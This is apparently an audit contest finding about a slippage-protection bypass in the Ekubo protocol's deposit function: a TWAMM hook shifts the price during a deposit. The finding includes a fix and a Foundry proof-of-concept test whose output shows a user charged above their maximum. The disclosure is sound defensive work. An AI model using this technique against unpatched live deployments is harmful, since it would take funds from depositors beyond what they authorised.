  "user_handle": "Albert",
  "body": "## Finding description and impact\n\n### Root Cause\n\nThe vulnerability lies in the `deposit` function of `BasePositions.sol`. This function calculates the liquidity to mint based on the pool's *current* price (before any state changes) and the user's provided `maxAmount0` and `maxAmount1` constraints.\n\nIt then calls `CORE.updatePosition` with this calculated liquidity. However, `CORE.updatePosition` triggers the `beforeUpdatePosition` hook on any registered extension (such as TWAMM) *before* executing the liquidity addition logic.\n\nIf the extension executes logic that changes the pool's price (e.g., executing pending virtual orders in TWAMM), the state of the pool shifts significantly between the initial check and the final execution. When `CORE` resumes the `updatePosition` logic, it recalculates the token amounts required for the *previously calculated liquidity* based on the *new* price.\n\nBecause `deposit` does not re-verify the final deducted amounts against `maxAmount0` and `maxAmount1` after the `lock` callback returns, the user can be charged amounts that exceed their specified limits.\n\n### Impact\n\nUsers can be forced to pay significantly more tokens than they authorized. This effectively bypasses the slippage protection that `maxAmount` arguments are intended to provide.\n\nIn a TWAMM pool, if a user deposits liquidity after a period of inactivity (or is sandwiched by a MEV bot triggering the TWAMM execution), the accumulated price impact from virtual orders will apply *during* their deposit transaction. This can shift the price unfavorably, causing the protocol to deduct more of the depreciated token to maintain the requested liquidity, directly violating the user's authorized maximums.\n\n\n## Recommended mitigation steps\n\nAdd explicit checks in `BasePositions.sol` after the lock callback returns to verify that the actually deducted amounts (`amount0`, `amount1`) do not exceed the user-provided `maxAmount0` and `maxAmount1`.\n\n```solidity\n    function deposit(...) public payable authorizedForNft(id) returns (uint128 liquidity, uint128 amount0, uint128 amount1) {\n        // ... existing logic ...\n\n        (amount0, amount1) = abi.decode(\n            lock(abi.encode(CALL_TYPE_DEPOSIT, msg.sender, id, poolKey, tickLower, tickUpper, liquidity)),\n            (uint128, uint128)\n        );\n\n+       // Mitigation: Verify actual amounts against user limits\n+       if (amount0 > maxAmount0) revert DepositOverflow();\n+       if (amount1 > maxAmount1) revert DepositOverflow();\n    }\n```",
  "proof_of_concept": "### Proof of Concept\n\nThe following test demonstrates the issue. A pool is initialized with a price of 1 Token0 = 3000 Token1. A user authorizes a deposit of max 1 Token0. However, a pending TWAMM sell order (100 Token0) executes during the deposit call, crashing the price of Token0. The protocol then deducts ~1.1 Token0 from the user, exceeding their 1.0 max limit.\n\n```solidity\n// SPDX-License-Identifier: ekubo-license-v1.eth\npragma solidity >=0.8.30;\n\nimport {BaseOrdersTest} from \"./Orders.t.sol\"; \nimport {CoreLib} from \"../src/libraries/CoreLib.sol\";\nimport {PoolKey} from \"../src/types/poolKey.sol\";\nimport {PoolConfig, createFullRangePoolConfig} from \"../src/types/poolConfig.sol\";\nimport {MIN_TICK, MAX_TICK} from \"../src/math/constants.sol\";\nimport {MIN_SQRT_RATIO, MAX_SQRT_RATIO, SqrtRatio, toSqrtRatio} from \"../src/types/sqrtRatio.sol\";\nimport {OrderKey} from \"../src/types/orderKey.sol\";\nimport {createOrderConfig} from \"../src/types/orderConfig.sol\";\nimport {nextValidTime} from \"../src/math/time.sol\";\nimport {ITWAMM} from \"../src/interfaces/extensions/ITWAMM.sol\";\nimport {sqrtRatioToTick} from \"../src/math/ticks.sol\";\nimport \"forge-std/console.sol\";\n\ncontract DepositSlippageExploitTest is BaseOrdersTest {\n    using CoreLib for *;\n\n    function setUp() public override {\n        super.setUp();\n        token0.approve(address(positions), type(uint256).max);\n        token1.approve(address(positions), type(uint256).max);\n        token0.approve(address(orders), type(uint256).max);\n        token1.approve(address(orders), type(uint256).max);\n    }\n\n    function test_Exploit_Deposit_MaxAmount_Bypass_Strict() public {\n        // 1. Setup: 1 Token0 = 3000 Token1\n        uint256 targetSqrtPriceX96 = 18638121572272664297274863329999000000000;\n        SqrtRatio initialSqrtRatio = toSqrtRatio(targetSqrtPriceX96, false);\n        int32 initialTick = sqrtRatioToTick(initialSqrtRatio); \n\n        PoolKey memory poolKey = PoolKey({\n            token0: address(token0), \n            token1: address(token1), \n            config: createFullRangePoolConfig(0, address(twamm))\n        });\n        \n        positions.maybeInitializePool(poolKey, initialTick);\n\n        // 2. Add Base Liquidity (1000 Token0 + 3M Token1)\n        positions.mintAndDeposit(\n            poolKey, \n            MIN_TICK, \n            MAX_TICK, \n            1000 ether, \n            3000000 ether, \n            0\n        );\n\n        // 3. Create TWAMM Sell Order (100 Token0)\n        uint256 time = block.timestamp;\n        uint256 startTime = nextValidTime(time, time + 100);\n        uint256 endTime = nextValidTime(time, startTime + 1000);\n        \n        orders.mintAndIncreaseSellAmount(\n            OrderKey({\n                token0: address(token0),\n                token1: address(token1),\n                config: createOrderConfig({_fee: 0, _isToken1: false, _startTime: uint64(startTime), _endTime: uint64(endTime)})\n            }),\n            100 ether, \n            type(uint112).max\n        );\n\n        vm.warp(endTime); \n\n        // 4. Victim attempts deposit (1 Token0 + 3000 Token1)\n        uint128 maxAmount0 = 1 ether;\n        uint128 maxAmount1 = 3000 ether;\n        \n        uint256 balance0Before = token0.balanceOf(address(this));\n        uint256 balance1Before = token1.balanceOf(address(this));\n        \n        positions.mintAndDeposit(\n            poolKey, \n            MIN_TICK, \n            MAX_TICK, \n            maxAmount0, \n            maxAmount1, \n            0 \n        );\n        \n        uint256 used0 = balance0Before - token0.balanceOf(address(this));\n        uint256 used1 = balance1Before - token1.balanceOf(address(this));\n        \n        console.log(\"User specified Max Amount0:\", maxAmount0);\n        console.log(\"Actually used Amount0:     \", used0);\n        console.log(\"User specified Max Amount1:\", maxAmount1);\n        console.log(\"Actually used Amount1:     \", used1);\n\n        if (used0 > maxAmount0) {\n            console.log(\"!!! Exploit Successful: Used more Token0 than maxAmount !!!\");\n            console.log(\"Excess Token0:\", used0 - maxAmount0);\n        }\n        \n        assertGt(used0, maxAmount0, \"Slippage protection bypassed\");\n    }\n}\n```\n\n### console command and output\n```bash\n➜  2025-11-ekubo git:(main) ✗ forge test --match-contract DepositSlippageExploitTest -vv\n[⠊] Compiling...\n[⠘] Compiling 1 files with Solc 0.8.31\n[⠊] Solc 0.8.31 finished in 17.12s\nCompiler run successful with warnings:\nWarning (3805): This is a pre-release compiler version, please do not use it in production.\n\nRan 1 test for test/Router2.t.sol:DepositSlippageExploitTest\n[PASS] test_Exploit_Deposit_MaxAmount_Bypass_Strict() (gas: 671116)\nLogs:\n  User specified Max Amount0: 1000000000000000000\n  Actually used Amount0:      1099990570882532357\n  User specified Max Amount1: 3000000000000000000000\n  Actually used Amount1:      2727270389454968424531\n  !!! Exploit Successful: Used more Token0 than maxAmount !!!\n  Excess Token0: 99990570882532357\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 18.28ms (5.49ms CPU time)\n\nRan 1 test suite in 479.21ms (18.28ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```",
